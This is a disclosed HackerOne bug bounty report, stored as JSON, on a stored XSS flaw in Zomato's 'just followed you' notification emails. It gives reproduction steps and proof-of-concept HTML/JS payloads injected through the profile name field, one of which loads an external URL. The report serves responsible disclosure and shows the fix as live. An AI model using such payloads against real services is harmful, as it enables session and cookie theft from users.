{"id":114879,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTQ4Nzk=","url":"https://hackerone.com/reports/114879","title":"Persistent input validation mail encoding vulnerability  in the \"just followed you\" email notification.","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-02-05T12:59:39.217Z","submitted_at":"2016-02-05T12:59:39.217Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"pr0tagon1st","url":"/pr0tagon1st","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/033/123/9e3397fc4128a6ea0579adedf2a30f47f54ad11a_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":2943,"url":"https://hackerone.com/zomato","handle":"zomato","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/943/71b47f9aa21166f0989dfb97112ca10c66a9d0b2_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/943/71b47f9aa21166f0989dfb97112ca10c66a9d0b2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Zomato","twitter_handle":"Zomato","website":"https://www.zomato.com","about":"The fastest way to search for great places to eat at and order from around you. Serving 24 countries worldwide."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2016-04-07T04:50:06.787Z","bug_reporter_agreed_on_going_public_at":"2016-03-30T16:06:42.871Z","team_member_agreed_on_going_public_at":"2016-04-07T04:50:06.516Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"This vulnerability allows an attacker to add custom html/js code to emails that are then sent to other users of zomato.com. \n\nThis vulnerability can be reproduced by any normal user (ie. unprivileged accounts) by editing their profile's \"your full name\" field with malicious code. This is not possible during registration as that input is filtered, however, it is possible when editing the user profile as no filtering of the \"your full name\" field is done at that point.\n\nThis vulnerability could be used to inject an img or iframe with an external js source that could expose a user's cookie information.\n\nThese are the steps to reproduce it:\n\n1. Register and verify an account with zomato.com\n2. Browse to the \"edit user profile\" page as a logged in user.\n3. Inject the desired html/js payload into the \"Your full name\" field.\n4. Save your profile.\n5. Browse to another user's profile.\n6. Click the \"Follow\" button.\n7. Other user will receive a \"\u003cpayload\u003e has just followed you!\" email within a few minutes that contains the html/js payload in the subject and body.\n\nI have used these payloads to confirm the vulnerability:\n```\n\"\u003e\u003c\"\u003cimg src=\"x\"\u003e%20%20\u003e \"\u003ciframe src=a\u003e%20\u003ciframe\u003e\n```\n```\n\u003cimg Src=\"http://goo.gl/JPx2sV\" onload=alert(\"PENTEST\")\u003e%20%20\u003e \"\u003ciframe Src=a\u003e%20\u003ciframe\u003e\n```\n\nAnd this is part of an email message I received that contains one of the payloads:\n```\n      \u003cspan style=\"color: white; font-size: 22px; line-height: 24px; display:block;\"\u003e\u003ca href=\"https://www.zomato.com/users/ltimg-srcquothttpgoogljpx2svquot-onloadalertquotpentestquotgt2020gt-quotltiframe-srcagt20ltiframegt-33442340?ref=email_follow_back_follower_link_1\" style=\"text-decoration: none;color: white;\"\u003e\n\u003cstrong\u003e\u003cimg Src=\"http://goo.gl/JPx2sV\" Onload=alert(\"PENTEST\")\u003e%20%20\u003e \"\u003ciframe Src=a\u003e%20\u003ciframe\u003e \u003c/strong\u003e\n\u003c/a\u003e just followed you.\u003c/span\u003e\n```\n\nWhich shows the unfiltered payload a victim would receive.\n\nThe accounts I have used for this test all use the email *@mattscodecave.com.","vulnerability_information_html":"\u003cp\u003eThis vulnerability allows an attacker to add custom html/js code to emails that are then sent to other users of zomato.com. \u003c/p\u003e\n\n\u003cp\u003eThis vulnerability can be reproduced by any normal user (ie. unprivileged accounts) by editing their profile\u0026#39;s \u0026quot;your full name\u0026quot; field with malicious code. This is not possible during registration as that input is filtered, however, it is possible when editing the user profile as no filtering of the \u0026quot;your full name\u0026quot; field is done at that point.\u003c/p\u003e\n\n\u003cp\u003eThis vulnerability could be used to inject an img or iframe with an external js source that could expose a user\u0026#39;s cookie information.\u003c/p\u003e\n\n\u003cp\u003eThese are the steps to reproduce it:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eRegister and verify an account with zomato.com\u003c/li\u003e\n\u003cli\u003eBrowse to the \u0026quot;edit user profile\u0026quot; page as a logged in user.\u003c/li\u003e\n\u003cli\u003eInject the desired html/js payload into the \u0026quot;Your full name\u0026quot; field.\u003c/li\u003e\n\u003cli\u003eSave your profile.\u003c/li\u003e\n\u003cli\u003eBrowse to another user\u0026#39;s profile.\u003c/li\u003e\n\u003cli\u003eClick the \u0026quot;Follow\u0026quot; button.\u003c/li\u003e\n\u003cli\u003eOther user will receive a \u0026quot;\u0026lt;payload\u0026gt; has just followed you!\u0026quot; email within a few minutes that contains the html/js payload in the subject and body.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eI have used these payloads to confirm the vulnerability:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026quot;\u0026gt;\u0026lt;\u0026quot;\u0026lt;img src=\u0026quot;x\u0026quot;\u0026gt;%20%20\u0026gt; \u0026quot;\u0026lt;iframe src=a\u0026gt;%20\u0026lt;iframe\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;img Src=\u0026quot;http://goo.gl/JPx2sV\u0026quot; onload=alert(\u0026quot;PENTEST\u0026quot;)\u0026gt;%20%20\u0026gt; \u0026quot;\u0026lt;iframe Src=a\u0026gt;%20\u0026lt;iframe\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAnd this is part of an email message I received that contains one of the payloads:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e      \u0026lt;span style=\u0026quot;color: white; font-size: 22px; line-height: 24px; display:block;\u0026quot;\u0026gt;\u0026lt;a href=\u0026quot;https://www.zomato.com/users/ltimg-srcquothttpgoogljpx2svquot-onloadalertquotpentestquotgt2020gt-quotltiframe-srcagt20ltiframegt-33442340?ref=email_follow_back_follower_link_1\u0026quot; style=\u0026quot;text-decoration: none;color: white;\u0026quot;\u0026gt;\n\u0026lt;strong\u0026gt;\u0026lt;img Src=\u0026quot;http://goo.gl/JPx2sV\u0026quot; Onload=alert(\u0026quot;PENTEST\u0026quot;)\u0026gt;%20%20\u0026gt; \u0026quot;\u0026lt;iframe Src=a\u0026gt;%20\u0026lt;iframe\u0026gt; \u0026lt;/strong\u0026gt;\n\u0026lt;/a\u0026gt; just followed you.\u0026lt;/span\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWhich shows the unfiltered payload a victim would receive.\u003c/p\u003e\n\n\u003cp\u003eThe accounts I have used for this test all use the email *@mattscodecave.com.\u003c/p\u003e\n","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-04-29T16:06:43.142Z","allow_singular_disclosure_after":-147269462.7359964,"singular_disclosure_allowed":true,"vote_count":4,"voters":["kiraak-boy","tarwadahorse","webtrack","dyabla"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":794004,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi @pr0tagon1st ,\n\nThe fix is live now.\nThank you for helping keep Zomato safe for the community!\n\nRegards,\nAshish","markdown_message":"\u003cp\u003eHi \u003ca href=\"/pr0tagon1st\"\u003e@pr0tagon1st\u003c/a\u003e ,\u003c/p\u003e\n\n\u003cp\u003eThe fix is live now.\u003cbr\u003e\nThank you for helping keep Zomato safe for the community!\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\nAshish\u003c/p\u003e\n","automated_response":false,"created_at":"2016-02-11T09:46:42.871Z","updated_at":"2016-02-11T09:46:42.871Z","actor":{"username":"ashishkanwar","cleared":false,"url":"/ashishkanwar","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/048/404/bc418c1ceeb4696649f18760a42f38ca70744417_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"pr0tagon1st","url":"/pr0tagon1st"},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":878228,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Hi, would you mind public disclosure? Thanks!","markdown_message":"\u003cp\u003eHi, would you mind public disclosure? Thanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-03-30T16:06:42.896Z","updated_at":"2016-03-30T16:06:42.896Z","first_to_agree":true,"actor":{"username":"pr0tagon1st","cleared":false,"url":"/pr0tagon1st","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/033/123/9e3397fc4128a6ea0579adedf2a30f47f54ad11a_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":893231,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-04-07T04:50:06.548Z","updated_at":"2016-04-07T04:50:06.548Z","actor":{"username":"chicken-tikka","cleared":false,"url":"/chicken-tikka","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/059/568/cdbb30fd8932f00a06868a737ab5bdc5c57e5f00_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":893232,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-04-07T04:50:06.813Z","updated_at":"2016-04-07T04:50:06.813Z","actor":{"username":"chicken-tikka","cleared":false,"url":"/chicken-tikka","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/059/568/cdbb30fd8932f00a06868a737ab5bdc5c57e5f00_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5206820,"is_internal":false,"editable":false,"type":"Activities::NotEligibleForBounty","message":"","markdown_message":"","automated_response":false,"created_at":"2019-06-27T14:51:26.114Z","updated_at":"2019-06-27T14:51:26.114Z","actor":{"url":"/zomato","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/943/71b47f9aa21166f0989dfb97112ca10c66a9d0b2_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Zomato"}},"genius_execution_id":null,"team_handle":"zomato","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}